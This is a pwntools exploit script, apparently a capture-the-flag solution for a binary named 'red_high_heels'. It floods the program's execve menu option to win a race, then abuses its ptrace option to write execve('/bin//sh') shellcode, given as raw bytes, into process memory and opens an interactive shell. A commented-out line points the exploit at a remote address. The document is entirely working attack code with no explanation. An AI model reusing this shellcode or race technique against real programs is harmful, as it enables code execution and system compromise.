from pwn import *

context(os = 'linux', arch = 'amd64', log_level = 'debug')
io = process('red_high_heels')
# io = remote('127.0.0.1', 10001)
# io = remote('47.104.169.32', 12233)
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
# libc = ELF('libc-2.23.so')
elf = ELF('red_high_heels')
shellcode = b'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'

def execve():
    io.sendlineafter('>> ', '3')
    io.sendlineafter('filename: ', 'redflag')


def ptrace(index, offset, value):
    io.sendline('4')
    io.sendline(str(index) + ' ' + str(offset) + ' ' + str(value))


def main():
    for _ in range(1000):
        sleep(0.001)
        execve()
    sleep(0.1)
    io.send(b'3\n\xf0\x9f\x91\xa0\n')
    
    payload = "4\n1000 0 {}\n".format(u64(shellcode[:8]))
    payload += "4\n1000 8 {}\n".format(u64(shellcode[8:16]))
    payload += "4\n1000 16 {}\n".format(u64(shellcode[16:24]))
    payload += "4\n1000 24 {}\n".format(u64(shellcode[24:].ljust(8, b'\x00')))
    for _ in range(100):
        io.send(payload)
    io.interactive()


if __name__ == '__main__':
    main()
